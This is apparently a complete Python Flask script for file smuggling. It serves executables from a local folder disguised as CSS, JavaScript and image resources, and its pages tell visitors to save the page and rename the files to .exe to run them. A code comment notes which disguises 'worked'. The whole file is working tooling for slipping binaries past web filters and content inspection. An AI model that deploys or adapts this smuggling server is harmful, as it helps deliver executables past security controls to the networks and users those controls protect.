from flask import Flask, Response
import os

app = Flask(__name__, static_folder=None)

BINARIES_FOLDER = "binaries/"

# Supported extensions for smuggling (ones that worked)
SMUGGLE_EXTENSIONS = [".css", ".js", ".png", ".jpg", ".gif"]

MIME_TYPES = {
    ".css": "text/css",
    ".js":  "application/javascript",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".gif": "image/gif",
}

def get_binaries():
    binaries = {}
    if os.path.exists(BINARIES_FOLDER):
        for filename in os.listdir(BINARIES_FOLDER):
            filepath = os.path.join(BINARIES_FOLDER, filename)
            if os.path.isfile(filepath):
                # Use filename without extension as the key
                name = os.path.splitext(filename)[0].lower()
                binaries[name] = filepath
    return binaries

def get_binary_content(name):
    binaries = get_binaries()
    if name in binaries:
        with open(binaries[name], 'rb') as f:
            return f.read()
    return None

def generate_file_list_html():
    binaries = get_binaries()
    rows = ""
    for name in sorted(binaries.keys()):
        rows += f'<tr><td><code>{name}</code></td><td><a href="/{name}">Download page</a></td></tr>\n'
    return rows

def generate_all_resources_html():
    binaries = get_binaries()
    html = ""
    for name in binaries.keys():
        # Add as hidden images so they get saved
        html += f'<img src="/static/{name}.jpg" class="hidden" alt="">\n'
    return html

def generate_single_page(name):
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>Resources - {name}</title>
    
    <link rel="stylesheet" href="/static/{name}.css">
    
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .hidden {{ display: none; }}
        a {{ color: #2563eb; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Resources</h2>
        <h3>{name}</h3>
        <p>Press <strong>CTRL+S</strong> to save this page for offline viewing.</p>
        <p>Saved resources will be in the <em>Resources - {name}_files</em> folder.</p>
        <p>Rename <code>{name}.css</code> or <code>{name}.jpg</code> to <code>.exe</code> to execute.</p>
        <hr>
        <p><a href="/">Back to all resources</a></p>
    </div>
    
    <script src="/static/{name}.js"></script>
    
    <img src="/static/{name}.png" class="hidden" alt="">
    <img src="/static/{name}.jpg" class="hidden" alt="">
    <img src="/static/{name}.gif" class="hidden" alt="">
</body>
</html>"""

@app.route('/')
def index():
    binaries = get_binaries()
    all_resources = generate_all_resources_html()
    file_rows = generate_file_list_html()
    
    # Generate CSS/JS links for all binaries
    css_links = "\n".join([f'<link rel="stylesheet" href="/static/{name}.css">' for name in binaries.keys()])
    js_links = "\n".join([f'<script src="/static/{name}.js"></script>' for name in binaries.keys()])
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Resources</title>
    
    {css_links}
    
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 600px;
        }}
        .hidden {{ display: none; }}
        table {{ margin: 20px auto; border-collapse: collapse; }}
        td, th {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
        th {{ background: #f0f0f0; }}
        code {{ background: #e5e7eb; padding: 2px 6px; border-radius: 3px; }}
        a {{ color: #2563eb; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Resources</h2>
        <p>Press <strong>CTRL+S</strong> to save this page and download <strong>all</strong> resources.</p>
        <p>Or select an individual resource below:</p>
        
        <table>
            <tr><th>Resource</th><th>Individual Download</th></tr>
            {file_rows}
        </table>
        
        <p><small>Rename saved files from <code>.jpg/.css/.js</code> to <code>.exe</code> to execute.</small></p>
    </div>
    
    {js_links}
    
    {all_resources}
</body>
</html>"""
    
    return html

@app.route('/<name>')
def single_binary_page(name):
    binaries = get_binaries()
    if name in binaries:
        return generate_single_page(name)
    return "Not found", 404

@app.route('/static/<path:filepath>')
def serve_static(filepath):
    # Parse filename: e.g., "cmd.jpg" -> name="cmd", ext=".jpg"
    basename = os.path.basename(filepath)
    name = os.path.splitext(basename)[0].lower()
    ext = os.path.splitext(basename)[1].lower()
    
    content = get_binary_content(name)
    if content is None:
        return "Not found", 404
    
    mime = MIME_TYPES.get(ext, "application/octet-stream")
    
    print(f"[+] Serving {name} as: {filepath} ({mime})")
    
    return Response(
        content,
        mimetype=mime,
        headers={'Content-Disposition': f'inline; filename="{basename}"'}
    )

if __name__ == '__main__':
    binaries = get_binaries()
    print(f"[*] Binaries folder: {BINARIES_FOLDER}")
    print(f"[*] Found {len(binaries)} binaries: {list(binaries.keys())}")
    app.run(host='0.0.0.0', port=8081)